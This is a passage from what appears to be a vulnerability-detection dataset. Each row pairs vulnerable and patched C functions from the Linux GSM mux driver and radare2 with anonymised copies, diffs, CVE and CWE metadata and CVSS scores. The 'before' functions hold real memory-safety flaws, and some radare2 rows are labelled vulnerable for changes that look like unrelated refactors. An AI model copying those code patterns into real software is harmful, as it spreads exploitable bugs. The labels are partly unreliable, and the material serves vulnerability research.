	for (i = NUM_DLCI - 1; i >= 0; i--)
		if (gsm->dlci[i]) {
			gsm_dlci_release(gsm->dlci[i]);
			gsm->dlci[i] = NULL;
		}
	mutex_unlock(&gsm->mutex);
	/* Now wipe the queues */
	tty_ldisc_flush(gsm->tty);
	list_for_each_entry_safe(txq, ntxq, &gsm->tx_ctrl_list, list)
		kfree(txq);
	INIT_LIST_HEAD(&gsm->tx_ctrl_list);
	list_for_each_entry_safe(txq, ntxq, &gsm->tx_data_list, list)
		kfree(txq);
	INIT_LIST_HEAD(&gsm->tx_data_list);
}","static void gsm_cleanup_mux(struct gsm_mux *VAR_0, bool VAR_1)
{
	int VAR_2;
	struct gsm_dlci *VAR_3;
	struct gsm_msg *VAR_4, *VAR_5;

	VAR_0->dead = true;
	mutex_lock(&VAR_0->mutex);

	VAR_3 = VAR_0->dlci[0];
	if (VAR_3) {
		if (VAR_1 && VAR_3->state != VAR_6) {
			gsm_dlci_begin_close(VAR_3);
			wait_event(VAR_0->event, VAR_3->state == VAR_6);
		}
		VAR_3->dead = true;
	}

	/* COMMENT_0 */
	del_timer_sync(&VAR_0->kick_timer);
	del_timer_sync(&VAR_0->t2_timer);
	del_timer_sync(&VAR_0->ka_timer);

	/* COMMENT_1 */
	flush_work(&VAR_0->tx_work);

	/* COMMENT_2 */
	if (VAR_0->has_devices) {
		gsm_unregister_devices(VAR_7, VAR_0->num);
		VAR_0->has_devices = false;
	}
	for (VAR_2 = VAR_8 - 1; VAR_2 >= 0; VAR_2--)
		if (VAR_0->dlci[VAR_2]) {
			gsm_dlci_release(VAR_0->dlci[VAR_2]);
			VAR_0->dlci[VAR_2] = NULL;
		}
	mutex_unlock(&VAR_0->mutex);
	/* COMMENT_3 */
	tty_ldisc_flush(VAR_0->tty);
	list_for_each_entry_safe(VAR_4, VAR_5, &VAR_0->tx_ctrl_list, VAR_9)
		kfree(VAR_4);
	INIT_LIST_HEAD(&VAR_0->tx_ctrl_list);
	list_for_each_entry_safe(VAR_4, VAR_5, &VAR_0->tx_data_list, VAR_9)
		kfree(VAR_4);
	INIT_LIST_HEAD(&VAR_0->tx_data_list);
}",torvalds/linux/3c4f8333b582487a2d1e02171f1465531cde53e3/n_gsm.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,12 +1,13 @@
 static void gsm_cleanup_mux(struct gsm_mux *gsm, bool disc)
 {
 	int i;
-	struct gsm_dlci *dlci = gsm->dlci[0];
+	struct gsm_dlci *dlci;
 	struct gsm_msg *txq, *ntxq;
 
 	gsm->dead = true;
 	mutex_lock(&gsm->mutex);
 
+	dlci = gsm->dlci[0];
 	if (dlci) {
 		if (disc && dlci->state != DLCI_CLOSED) {
 			gsm_dlci_begin_close(dlci);","{'deleted_lines': ['\tstruct gsm_dlci *dlci = gsm->dlci[0];'], 'added_lines': ['\tstruct gsm_dlci *dlci;', '\tdlci = gsm->dlci[0];']}",True,"A race condition was found in the GSM 0710 tty multiplexor in the Linux kernel. This issue occurs when two threads execute the GSMIOC_SETCONF ioctl on the same tty file descriptor with the gsm line discipline enabled, and can lead to a use-after-free problem on a struct gsm_dlci while restarting the gsm mux. This could allow a local unprivileged user to escalate their privileges on the system.",7.8,HIGH,2,valid,2023-08-11T03:11:21Z,4
CVE-2023-4322,['CWE-787'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,1,radareorg/radare2,"Fix 1byte heap oobread in the brainfuck disassembler

* https://huntr.dev/bounties/06e2484c-d6f1-4497-af67-26549be9fffd/
* Kudos to @7resp4ss for reporting",ba919adb74ac368bf76b150a00347ded78b572dd,https://github.com/radareorg/radare2/commit/ba919adb74ac368bf76b150a00347ded78b572dd,libr/core/cmd_anal.c,cmd_sdbk,"static void cmd_sdbk(Sdb *db, const char *input) {
char *out = (input[0] == ' ')
? sdb_querys (db, NULL, 0, input + 1)
: sdb_querys (db, NULL, 0, ""*"");
if (out) {
r_cons_println (out);
free (out);
} else {
R_LOG_ERROR (""Usage: ask [query]"");
}
}","static void cmd_sdbk(Sdb *VAR_0, const char *VAR_1) {
char *VAR_2 = (VAR_1[0] == ' ')
? sdb_querys (VAR_0, NULL, 0, VAR_1 + 1)
: sdb_querys (VAR_0, NULL, 0, ""*"");
if (VAR_2) {
r_cons_println (VAR_2);
free (VAR_2);
} else {
R_LOG_ERROR (""Usage: ask [query]"");
}
}",radareorg/radare2/ba919adb74ac368bf76b150a00347ded78b572dd/cmd_anal.c/vul/before/3.json,"static void cmd_sdbk(Sdb *db, const char *input) {
	const char *arg = (input[0] == ' ')? input + 1: ""*"";
	char *out = sdb_querys (db, NULL, 0, arg);
	if (out) {
		r_cons_println (out);
		free (out);
	} else {
		R_LOG_ERROR (""Usage: ask [query]"");
	}
}","static void cmd_sdbk(Sdb *VAR_0, const char *VAR_1) {
	const char *VAR_2 = (VAR_1[0] == ' ')? VAR_1 + 1: ""*"";
	char *VAR_3 = sdb_querys (VAR_0, NULL, 0, VAR_2);
	if (VAR_3) {
		r_cons_println (VAR_3);
		free (VAR_3);
	} else {
		R_LOG_ERROR (""Usage: ask [query]"");
	}
}",radareorg/radare2/ba919adb74ac368bf76b150a00347ded78b572dd/cmd_anal.c/vul/after/3.json,"--- func_before
+++ func_after
@@ -1,7 +1,6 @@
 static void cmd_sdbk(Sdb *db, const char *input) {
-	char *out = (input[0] == ' ')
-		? sdb_querys (db, NULL, 0, input + 1)
-		: sdb_querys (db, NULL, 0, ""*"");
+	const char *arg = (input[0] == ' ')? input + 1: ""*"";
+	char *out = sdb_querys (db, NULL, 0, arg);
 	if (out) {
 		r_cons_println (out);
 		free (out);","{'deleted_lines': [""\tchar *out = (input[0] == ' ')"", '\t\t? sdb_querys (db, NULL, 0, input + 1)', '\t\t: sdb_querys (db, NULL, 0, ""*"");'], 'added_lines': ['\tconst char *arg = (input[0] == \' \')? input + 1: ""*"";', '\tchar *out = sdb_querys (db, NULL, 0, arg);']}",True,Heap-based Buffer Overflow in GitHub repository radareorg/radare2 prior to 5.9.0.,9.8,CRITICAL,3,valid,2023-08-14T13:56:13Z,4
CVE-2023-4322,['CWE-787'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,1,radareorg/radare2,"Fix 1byte heap oobread in the brainfuck disassembler

* https://huntr.dev/bounties/06e2484c-d6f1-4497-af67-26549be9fffd/
* Kudos to @7resp4ss for reporting",ba919adb74ac368bf76b150a00347ded78b572dd,https://github.com/radareorg/radare2/commit/ba919adb74ac368bf76b150a00347ded78b572dd,libr/core/cmd_anal.c,_anal_calls,"static void _anal_calls(RCore *core, ut64 addr, ut64 addr_end, bool printCommands, bool importsOnly) {
RAnalOp op = {0};
int depth = r_config_get_i (core->config, ""anal.depth"");
const int addrbytes = core->io->addrbytes;
const int bsz = 4096;
int bufi = 0;
int bufi_max = bsz - 16;
if (addr_end - addr > UT32_MAX) {
return;
}
ut8 *buf = malloc (bsz);
ut8 *block0 = calloc (1, bsz);
ut8 *block1 = malloc (bsz);
if (!buf || !block0 || !block1) {
free (buf);
free (block0);
free (block1);
return;
}
memset (block1, -1, bsz);
int minop = r_anal_archinfo (core->anal, R_ANAL_ARCHINFO_MIN_OP_SIZE);
if (minop < 1) {
minop = 1;
}
int setBits = r_config_get_i (core->config, ""asm.bits"");
r_cons_break_push (NULL, NULL);
while (addr < addr_end && !r_cons_is_breaked ()) {
if (bufi > bufi_max) {
bufi = 0;
}
if (!bufi) {
(void)r_io_read_at (core->io, addr, buf, bsz);
}
if (!memcmp (buf, block0, bsz) || !memcmp (buf, block1, bsz)) {
addr += bsz;
continue;
}
RAnalHint *hint = r_anal_hint_get (core->anal, addr);
if (hint && hint->bits) {
setBits = hint->bits;
}
r_anal_hint_free (hint);
if (setBits != core->rasm->config->bits) {
r_config_set_i (core->config, ""asm.bits"", setBits);
}
if (r_anal_op (core->anal, &op, addr, buf + bufi, bsz - bufi, 0) > 0) {
if (op.size < 1) {
op.size = minop;
}
if (op.type == R_ANAL_OP_TYPE_CALL) {
bool isValidCall = true;
if (importsOnly) {
RFlagItem *f = r_flag_get_i (core->flags, op.jump);
if (!f || !strstr (f->name, ""imp."")) {
isValidCall = false;
}
}
RBinReloc *rel = r_core_getreloc (core, addr, op.size);
if (rel && (rel->import || rel->symbol)) {
isValidCall = false;
}
if (isValidCall) {
ut8 buf[4] = {0};
r_io_read_at (core->io, op.jump, buf, 4);
isValidCall = memcmp (buf, ""\x00\x00\x00\x00"", 4);
}
if (isValidCall) {
#if JAYRO_03
if (!anal_is_bad_call (core, from, to, addr, buf, bufi)) {
fcn = r_anal_get_fcn_in (core->anal, op.jump, R_ANAL_FCN_TYPE_ROOT);
if (!fcn) {
r_core_anal_fcn (core, op.jump, addr, R_ANAL_REF_TYPE_CALL, depth - 1);
}
}
#else
if (printCommands) {
r_cons_printf (""ax 0x%08"" PFMT64x "" 0x%08"" PFMT64x ""\n"", op.jump, addr);
r_cons_printf (""af @ 0x%08"" PFMT64x""\n"", op.jump);
} else {
r_anal_xrefs_set (core->anal, addr, op.jump, R_ANAL_REF_TYPE_CALL);
if (r_io_is_valid_offset (core->io, op.jump, 1)) {
r_core_anal_fcn (core, op.jump, addr, R_ANAL_REF_TYPE_CALL, depth - 1);
}
}
#endif
}
}
} else {
op.size = minop;
}
if ((int)op.size < 1) {
op.size = minop;
}
addr += op.size;
bufi += addrbytes * op.size;
r_anal_op_fini (&op);
}
r_cons_break_pop ();
free (buf);
free (block0);
free (block1);
}","static void _anal_calls(RCore *VAR_0, ut64 VAR_1, ut64 VAR_2, bool VAR_3, bool VAR_4) {
RAnalOp VAR_5 = {0};
int VAR_6 = r_config_get_i (VAR_0->config, ""anal.depth"");
const int VAR_7 = VAR_0->io->addrbytes;
const int VAR_8 = 4096;
int VAR_9 = 0;
int VAR_10 = VAR_8 - 16;
if (VAR_2 - VAR_1 > VAR_11) {
return;
}
ut8 *VAR_12 = malloc (VAR_8);
ut8 *VAR_13 = calloc (1, VAR_8);
ut8 *VAR_14 = malloc (VAR_8);
if (!VAR_12 || !VAR_13 || !VAR_14) {
free (VAR_12);
free (VAR_13);
free (VAR_14);
return;
}
memset (VAR_14, -1, VAR_8);
int VAR_15 = r_anal_archinfo (VAR_0->anal, VAR_16);
if (VAR_15 < 1) {
VAR_15 = 1;
}
int VAR_17 = r_config_get_i (VAR_0->config, ""asm.bits"");
r_cons_break_push (NULL, NULL);
while (VAR_1 < VAR_2 && !r_cons_is_breaked ()) {
if (VAR_9 > VAR_10) {
VAR_9 = 0;
}
if (!VAR_9) {
(void)r_io_read_at (VAR_0->io, VAR_1, VAR_12, VAR_8);
}
if (!memcmp (VAR_12, VAR_13, VAR_8) || !memcmp (VAR_12, VAR_14, VAR_8)) {
VAR_1 += VAR_8;
continue;
}
RAnalHint *VAR_18 = r_anal_hint_get (VAR_0->anal, VAR_1);
if (VAR_18 && VAR_18->bits) {
VAR_17 = VAR_18->bits;
}
r_anal_hint_free (VAR_18);
if (VAR_17 != VAR_0->rasm->config->bits) {
r_config_set_i (VAR_0->config, ""asm.bits"", VAR_17);
}
if (r_anal_op (VAR_0->anal, &VAR_5, VAR_1, VAR_12 + VAR_9, VAR_8 - VAR_9, 0) > 0) {
if (VAR_5.size < 1) {
VAR_5.size = VAR_15;
}
if (VAR_5.type == VAR_19) {
bool VAR_20 = true;
if (VAR_4) {
RFlagItem *VAR_21 = r_flag_get_i (VAR_0->flags, VAR_5.jump);
if (!VAR_21 || !strstr (VAR_21->name, ""imp."")) {
VAR_20 = false;
}
}
RBinReloc *VAR_22 = r_core_getreloc (VAR_0, VAR_1, VAR_5.size);
if (VAR_22 && (VAR_22->import || VAR_22->symbol)) {
VAR_20 = false;
}
if (VAR_20) {
ut8 VAR_12[4] = {0};
r_io_read_at (VAR_0->io, VAR_5.jump, VAR_12, 4);
VAR_20 = memcmp (VAR_12, ""\x00\x00\x00\x00"", 4);
}
if (VAR_20) {
#if VAR_23
if (!anal_is_bad_call (VAR_0, VAR_24, VAR_25, VAR_1, VAR_12, VAR_9)) {
VAR_26 = r_anal_get_fcn_in (VAR_0->anal, VAR_5.jump, VAR_27);
if (!VAR_26) {
r_core_anal_fcn (VAR_0, VAR_5.jump, VAR_1, VAR_28, VAR_6 - 1);
}
}
#else
if (VAR_3) {
r_cons_printf (""ax 0x%08"" VAR_29 "" 0x%08"" VAR_29 ""\n"", VAR_5.jump, VAR_1);
r_cons_printf (""af @ 0x%08"" VAR_29""\n"", VAR_5.jump);
} else {
r_anal_xrefs_set (VAR_0->anal, VAR_1, VAR_5.jump, VAR_28);
if (r_io_is_valid_offset (VAR_0->io, VAR_5.jump, 1)) {
r_core_anal_fcn (VAR_0, VAR_5.jump, VAR_1, VAR_28, VAR_6 - 1);
}
}
#endif
}
}
} else {
VAR_5.size = VAR_15;
}
if ((int)VAR_5.size < 1) {
VAR_5.size = VAR_15;
}
VAR_1 += VAR_5.size;
VAR_9 += VAR_7 * VAR_5.size;
r_anal_op_fini (&VAR_5);
}
r_cons_break_pop ();
free (VAR_12);
free (VAR_13);
free (VAR_14);
}",radareorg/radare2/ba919adb74ac368bf76b150a00347ded78b572dd/cmd_anal.c/vul/before/1.json,"static void _anal_calls(RCore *core, ut64 addr, ut64 addr_end, bool printCommands, bool importsOnly) {
	RAnalOp op = {0};
	int depth = r_config_get_i (core->config, ""anal.depth"");
	const int addrbytes = core->io->addrbytes;
	const int bsz = 4096;
	int bufi = 0;
	int bufi_max = bsz - 16;
	if (addr_end - addr > UT32_MAX) {
		return;
	}
	ut8 *buf = malloc (bsz);
	ut8 *block0 = calloc (1, bsz);
	ut8 *block1 = malloc (bsz);
	if (!buf || !block0 || !block1) {
		free (buf);
		free (block0);
		free (block1);
		return;
	}
	memset (block1, -1, bsz);
	int minop = r_anal_archinfo (core->anal, R_ANAL_ARCHINFO_MIN_OP_SIZE);
	if (minop < 1) {
		minop = 1;
	}
	int setBits = r_config_get_i (core->config, ""asm.bits"");
	r_cons_break_push (NULL, NULL);
	while (addr < addr_end && !r_cons_is_breaked ()) {
		// TODO: too many ioreads here
		if (bufi > bufi_max) {
			bufi = 0;
		}
		if (!bufi) {
			(void)r_io_read_at (core->io, addr, buf, bsz);
		}
		if (!memcmp (buf, block0, bsz) || !memcmp (buf, block1, bsz)) {
			addr += bsz;
			continue;
		}
		RAnalHint *hint = r_anal_hint_get (core->anal, addr);
		if (hint && hint->bits) {
			setBits = hint->bits;
		}
		r_anal_hint_free (hint);
		if (setBits != core->rasm->config->bits) {
			r_config_set_i (core->config, ""asm.bits"", setBits);
		}
		if (r_anal_op (core->anal, &op, addr, buf + bufi, bsz - bufi, 0) > 0) {
			if (op.size < 1) {
				op.size = minop;
			}
			if (op.type == R_ANAL_OP_TYPE_CALL) {
				bool isValidCall = true;
				if (importsOnly) {
					RFlagItem *f = r_flag_get_i (core->flags, op.jump);
					if (!f || !strstr (f->name, ""imp."")) {
						isValidCall = false;
					}
				}
				RBinReloc *rel = r_core_getreloc (core, addr, op.size);
				if (rel && (rel->import || rel->symbol)) {
					isValidCall = false;
				}
				if (isValidCall) {
					ut8 zbuf[4] = {0};
					r_io_read_at (core->io, op.jump, zbuf, 4);
					isValidCall = memcmp (zbuf, ""\x00\x00\x00\x00"", 4);
				}
				if (isValidCall) {
#if JAYRO_03
					if (!anal_is_bad_call (core, from, to, addr, buf, bufi)) {
						fcn = r_anal_get_fcn_in (core->anal, op.jump, R_ANAL_FCN_TYPE_ROOT);
						if (!fcn) {
							r_core_anal_fcn (core, op.jump, addr, R_ANAL_REF_TYPE_CALL, depth - 1);
						}
					}
#else
					if (printCommands) {
						r_cons_printf (""ax 0x%08"" PFMT64x "" 0x%08"" PFMT64x ""\n"", op.jump, addr);
						r_cons_printf (""af @ 0x%08"" PFMT64x""\n"", op.jump);
					} else {
						// add xref here
						r_anal_xrefs_set (core->anal, addr, op.jump, R_ANAL_REF_TYPE_CALL);
						if (r_io_is_valid_offset (core->io, op.jump, 1)) {
							r_core_anal_fcn (core, op.jump, addr, R_ANAL_REF_TYPE_CALL, depth - 1);
						}
					}
#endif
				}
			}
		} else {
			op.size = minop;
		}
		if ((int)op.size < 1) {
			op.size = minop;
		}
		addr += op.size;
		bufi += addrbytes * op.size;
		r_anal_op_fini (&op);
	}
	r_cons_break_pop ();
	free (buf);
	free (block0);
	free (block1);
}","static void _anal_calls(RCore *VAR_0, ut64 VAR_1, ut64 VAR_2, bool VAR_3, bool VAR_4) {
	RAnalOp VAR_5 = {0};
	int VAR_6 = r_config_get_i (VAR_0->config, ""anal.depth"");
	const int VAR_7 = VAR_0->io->addrbytes;
	const int VAR_8 = 4096;
	int VAR_9 = 0;
	int VAR_10 = VAR_8 - 16;
	if (VAR_2 - VAR_1 > VAR_11) {
		return;
	}
	ut8 *VAR_12 = malloc (VAR_8);
	ut8 *VAR_13 = calloc (1, VAR_8);
	ut8 *VAR_14 = malloc (VAR_8);
	if (!VAR_12 || !VAR_13 || !VAR_14) {
		free (VAR_12);
		free (VAR_13);
		free (VAR_14);
		return;
	}
	memset (VAR_14, -1, VAR_8);
	int VAR_15 = r_anal_archinfo (VAR_0->anal, VAR_16);
	if (VAR_15 < 1) {
		VAR_15 = 1;
	}
	int VAR_17 = r_config_get_i (VAR_0->config, ""asm.bits"");
	r_cons_break_push (NULL, NULL);
	while (VAR_1 < VAR_2 && !r_cons_is_breaked ()) {
		/* COMMENT_0 */
		if (VAR_9 > VAR_10) {
			VAR_9 = 0;
		}
		if (!VAR_9) {
			(void)r_io_read_at (VAR_0->io, VAR_1, VAR_12, VAR_8);
		}
		if (!memcmp (VAR_12, VAR_13, VAR_8) || !memcmp (VAR_12, VAR_14, VAR_8)) {
			VAR_1 += VAR_8;
			continue;
		}
		RAnalHint *VAR_18 = r_anal_hint_get (VAR_0->anal, VAR_1);
		if (VAR_18 && VAR_18->bits) {
			VAR_17 = VAR_18->bits;
		}
		r_anal_hint_free (VAR_18);
		if (VAR_17 != VAR_0->rasm->config->bits) {
			r_config_set_i (VAR_0->config, ""asm.bits"", VAR_17);
		}
		if (r_anal_op (VAR_0->anal, &VAR_5, VAR_1, VAR_12 + VAR_9, VAR_8 - VAR_9, 0) > 0) {
			if (VAR_5.size < 1) {
				VAR_5.size = VAR_15;
			}
			if (VAR_5.type == VAR_19) {
				bool VAR_20 = true;
				if (VAR_4) {
					RFlagItem *VAR_21 = r_flag_get_i (VAR_0->flags, VAR_5.jump);
					if (!VAR_21 || !strstr (VAR_21->name, ""imp."")) {
						VAR_20 = false;
					}
				}
				RBinReloc *VAR_22 = r_core_getreloc (VAR_0, VAR_1, VAR_5.size);
				if (VAR_22 && (VAR_22->import || VAR_22->symbol)) {
					VAR_20 = false;
				}
				if (VAR_20) {
					ut8 VAR_23[4] = {0};
					r_io_read_at (VAR_0->io, VAR_5.jump, VAR_23, 4);
					VAR_20 = memcmp (VAR_23, ""\x00\x00\x00\x00"", 4);
				}
				if (VAR_20) {
#if VAR_24
					if (!anal_is_bad_call (VAR_0, VAR_25, VAR_26, VAR_1, VAR_12, VAR_9)) {
						VAR_27 = r_anal_get_fcn_in (VAR_0->anal, VAR_5.jump, VAR_28);
						if (!VAR_27) {
							r_core_anal_fcn (VAR_0, VAR_5.jump, VAR_1, VAR_29, VAR_6 - 1);
						}
					}
#else
					if (VAR_3) {
						r_cons_printf (""ax 0x%08"" VAR_30 "" 0x%08"" VAR_30 ""\n"", VAR_5.jump, VAR_1);
						r_cons_printf (""af @ 0x%08"" VAR_30""\n"", VAR_5.jump);
					} else {
						/* COMMENT_1 */
						r_anal_xrefs_set (VAR_0->anal, VAR_1, VAR_5.jump, VAR_29);
						if (r_io_is_valid_offset (VAR_0->io, VAR_5.jump, 1)) {
							r_core_anal_fcn (VAR_0, VAR_5.jump, VAR_1, VAR_29, VAR_6 - 1);
						}
					}
#endif
				}
			}
		} else {
			VAR_5.size = VAR_15;
		}
		if ((int)VAR_5.size < 1) {
			VAR_5.size = VAR_15;
		}
		VAR_1 += VAR_5.size;
		VAR_9 += VAR_7 * VAR_5.size;
		r_anal_op_fini (&VAR_5);
	}
	r_cons_break_pop ();
	free (VAR_12);
	free (VAR_13);
	free (VAR_14);
}",radareorg/radare2/ba919adb74ac368bf76b150a00347ded78b572dd/cmd_anal.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -61,9 +61,9 @@
 					isValidCall = false;
 				}
 				if (isValidCall) {
-					ut8 buf[4] = {0};
-					r_io_read_at (core->io, op.jump, buf, 4);
-					isValidCall = memcmp (buf, ""\x00\x00\x00\x00"", 4);
+					ut8 zbuf[4] = {0};
+					r_io_read_at (core->io, op.jump, zbuf, 4);
+					isValidCall = memcmp (zbuf, ""\x00\x00\x00\x00"", 4);
 				}
 				if (isValidCall) {
 #if JAYRO_03","{'deleted_lines': ['\t\t\t\t\tut8 buf[4] = {0};', '\t\t\t\t\tr_io_read_at (core->io, op.jump, buf, 4);', '\t\t\t\t\tisValidCall = memcmp (buf, ""\\x00\\x00\\x00\\x00"", 4);'], 'added_lines': ['\t\t\t\t\tut8 zbuf[4] = {0};', '\t\t\t\t\tr_io_read_at (core->io, op.jump, zbuf, 4);', '\t\t\t\t\tisValidCall = memcmp (zbuf, ""\\x00\\x00\\x00\\x00"", 4);']}",True,Heap-based Buffer Overflow in GitHub repository radareorg/radare2 prior to 5.9.0.,9.8,CRITICAL,3,valid,2023-08-14T13:56:13Z,4
CVE-2023-4322,['CWE-787'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,1,radareorg/radare2,"Fix 1byte heap oobread in the brainfuck disassembler

* https://huntr.dev/bounties/06e2484c-d6f1-4497-af67-26549be9fffd/
* Kudos to @7resp4ss for reporting",ba919adb74ac368bf76b150a00347ded78b572dd,https://github.com/radareorg/radare2/commit/ba919adb74ac368bf76b150a00347ded78b572dd,libr/arch/p/bf/plugin.c,decode,"static bool decode(RArchSession *as, RAnalOp *op, RArchDecodeMask mask) {
int len = op->size;
const ut8 *_buf = op->bytes;
const ut64 addr = op->addr;
if (len < 1) {
return false;
}
ut8 *buf = (ut8*)_buf; ut64 dst = 0LL;
if (!op) {
return 1;
}
if (mask & R_ARCH_OP_MASK_DISASM) {
(void) disassemble (op, buf, len);
}
r_strbuf_init (&op->esil);
op->size = 1;
op->id = getid (buf[0]);
switch (buf[0]) {
case '[':
op->type = R_ANAL_OP_TYPE_CJMP;
op->jump = dst;
op->fail = addr + 1;
RArch *a = as->arch;
RIOReadAt read_at = NULL;
RBin *bin = R_UNWRAP2 (a, binb.bin);
if (bin && bin->iob.read_at) {
RIOReadAt read_at = bin->iob.read_at;
buf = malloc (0xff);
read_at (bin->iob.io, op->addr, buf, 0xff);
}
r_strbuf_set (&op->esil, ""1,pc,-,brk,=[4],4,brk,+="");
#if 1
{
const ut8 *p = buf + 1;
int lev = 0, i = 1;
len--;
while (i < len && *p) {
if (*p == '[') {
lev++;
}
if (*p == ']') {
lev--;
if (lev == -1) {
dst = addr + (size_t)(p - buf) + 1;
op->jump = dst;
r_strbuf_set (&op->esil, ""1,pc,-,brk,=[4],4,brk,+=,"");
goto beach;
}
}
if (*p == 0x00 || *p == 0xff) {
op->type = R_ANAL_OP_TYPE_ILL;
goto beach;
}
if (read_at && i == len - 1) {
break;
int new_buf_len = len + 1 + BUFSIZE_INC;
ut8 *new_buf = calloc (new_buf_len, 1);
if (new_buf) {
free (buf);
memcpy (new_buf, op->bytes, new_buf_len);
buf = new_buf;
read_at (bin->iob.io, op->addr + i, buf + i, 0xff);
p = buf + i;
len += BUFSIZE_INC;
}
}
p++;
i++;
}
}
beach:
free (buf);
#endif
break;
case ']':
op->type = R_ANAL_OP_TYPE_UJMP;
r_strbuf_set (&op->esil, ""4,brk,-=,ptr,[1],?{,brk,[4],pc,=,}"");
break;
case '>':
op->type = R_ANAL_OP_TYPE_ADD;
op->size = countChar (buf, len, '>');
r_strbuf_setf (&op->esil, ""%d,ptr,+="", op->size);
break;
case '<':
op->type = R_ANAL_OP_TYPE_SUB;
op->size = countChar (buf, len, '<');
r_strbuf_setf (&op->esil, ""%d,ptr,-="", op->size);
break;
case '+':
op->size = countChar (buf, len, '+');
op->type = R_ANAL_OP_TYPE_ADD;
r_strbuf_setf (&op->esil, ""%d,ptr,+=[1]"", op->size);
break;
case '-':
op->type = R_ANAL_OP_TYPE_SUB;
op->size = countChar (buf, len, '-');
r_strbuf_setf (&op->esil, ""%d,ptr,-=[1]"", op->size);
break;
case '.':
op->type = R_ANAL_OP_TYPE_STORE;
r_strbuf_set (&op->esil, ""ptr,[1],scr,=[1],1,scr,+="");
break;
case ',':
op->type = R_ANAL_OP_TYPE_LOAD;
r_strbuf_set (&op->esil, ""kbd,[1],ptr,=[1],1,kbd,+="");
break;
case 0x00:
case 0xff:
op->type = R_ANAL_OP_TYPE_TRAP;
break;
default:
op->type = R_ANAL_OP_TYPE_NOP;
r_strbuf_set (&op->esil, "","");
break;
}
return op->size;
}","static bool decode(RArchSession *VAR_0, RAnalOp *VAR_1, RArchDecodeMask VAR_2) {
int VAR_3 = VAR_1->size;
const ut8 *VAR_4 = VAR_1->bytes;
const ut64 VAR_5 = VAR_1->addr;
if (VAR_3 < 1) {
return false;
}
ut8 *VAR_6 = (ut8*)VAR_4; 
ut64 VAR_7 = 0LL;
if (!VAR_1) {
return 1;
}
if (VAR_2 & VAR_8) {
(void) disassemble (VAR_1, VAR_6, VAR_3);
}
r_strbuf_init (&VAR_1->esil);
VAR_1->size = 1;
VAR_1->id = getid (VAR_6[0]);
switch (VAR_6[0]) {
case '[':
VAR_1->type = VAR_9;
VAR_1->jump = VAR_7;
VAR_1->fail = VAR_5 + 1;
RArch *VAR_10 = VAR_0->arch;
RIOReadAt VAR_11 = NULL;
RBin *VAR_12 = R_UNWRAP2 (VAR_10, VAR_13.bin);
if (VAR_12 && VAR_12->iob.read_at) {
RIOReadAt VAR_11 = VAR_12->iob.read_at;
VAR_6 = malloc (0xff);
VAR_11 (VAR_12->iob.io, VAR_1->addr, VAR_6, 0xff);
}
r_strbuf_set (&VAR_1->esil, ""1,pc,-,brk,=[4],4,brk,+="");
#if 1
{
const ut8 *VAR_14 = VAR_6 + 1;
int VAR_15 = 0, VAR_16 = 1;
VAR_3--;
while (VAR_16 < VAR_3 && *VAR_14) {
if (*VAR_14 == '[') {
VAR_15++;
}
if (*VAR_14 == ']') {
VAR_15--;
if (VAR_15 == -1) {
VAR_7 = VAR_5 + (size_t)(VAR_14 - VAR_6) + 1;
VAR_1->jump = VAR_7;
r_strbuf_set (&VAR_1->esil, ""1,pc,-,brk,=[4],4,brk,+=,"");
goto beach;
}
}
if (*VAR_14 == 0x00 || *VAR_14 == 0xff) {
VAR_1->type = VAR_17;
goto beach;
}
if (VAR_11 && VAR_16 == VAR_3 - 1) {
break;
int VAR_18 = VAR_3 + 1 + VAR_19;
ut8 *VAR_20 = calloc (VAR_18, 1);
if (VAR_20) {
free (VAR_6);
memcpy (VAR_20, VAR_1->bytes, VAR_18);
VAR_6 = VAR_20;
VAR_11 (VAR_12->iob.io, VAR_1->addr + VAR_16, VAR_6 + VAR_16, 0xff);
VAR_14 = VAR_6 + VAR_16;
VAR_3 += VAR_19;
}
}
VAR_14++;
VAR_16++;
}
}
beach:
free (VAR_6);
#endif
break;
case ']':
VAR_1->type = VAR_21;
r_strbuf_set (&VAR_1->esil, ""4,brk,-=,ptr,[1],?{,brk,[4],pc,=,}"");
break;
case '>':
VAR_1->type = VAR_22;
VAR_1->size = countChar (VAR_6, VAR_3, '>');
r_strbuf_setf (&VAR_1->esil, ""%d,ptr,+="", VAR_1->size);
break;
case '<':
VAR_1->type = VAR_23;
VAR_1->size = countChar (VAR_6, VAR_3, '<');
r_strbuf_setf (&VAR_1->esil, ""%d,ptr,-="", VAR_1->size);
break;
case '+':
VAR_1->size = countChar (VAR_6, VAR_3, '+');
VAR_1->type = VAR_22;
r_strbuf_setf (&VAR_1->esil, ""%d,ptr,+=[1]"", VAR_1->size);
break;
case '-':
VAR_1->type = VAR_23;
VAR_1->size = countChar (VAR_6, VAR_3, '-');
r_strbuf_setf (&VAR_1->esil, ""%d,ptr,-=[1]"", VAR_1->size);
break;
case '.':
VAR_1->type = VAR_24;
r_strbuf_set (&VAR_1->esil, ""ptr,[1],scr,=[1],1,scr,+="");
break;
case ',':
VAR_1->type = VAR_25;
r_strbuf_set (&VAR_1->esil, ""kbd,[1],ptr,=[1],1,kbd,+="");
break;
case 0x00:
case 0xff:
VAR_1->type = VAR_26;
break;
default:
VAR_1->type = VAR_27;
r_strbuf_set (&VAR_1->esil, "","");
break;
}
return VAR_1->size;
}",radareorg/radare2/ba919adb74ac368bf76b150a00347ded78b572dd/plugin.c/vul/before/1.json,"static bool decode(RArchSession *as, RAnalOp *op, RArchDecodeMask mask) {
	int len = op->size;
	if (len < 1) {
		return false;
	}
	ut8 *buf = op->bytes;
	const ut64 addr = op->addr;
	ut64 dst = 0LL;
	if (!op) {
		return 1;
	}
	if (mask & R_ARCH_OP_MASK_DISASM) {
		(void) disassemble (op, buf, len);
	}
	r_strbuf_init (&op->esil);
	op->size = 1;
	op->id = getid (buf[0]);
	switch (buf[0]) {
	case '[':
		op->type = R_ANAL_OP_TYPE_CJMP;
		// read ahead to find the ] bracket
		op->jump = dst;
		op->fail = addr + 1;
		RArch *a = as->arch;
		RIOReadAt read_at = NULL;
		RBin *bin = R_UNWRAP2 (a, binb.bin);
		if (bin && bin->iob.read_at) {
			RIOReadAt read_at = bin->iob.read_at;
			buf = malloc (0xff);
			read_at (bin->iob.io, op->addr, buf, 0xff);
		}
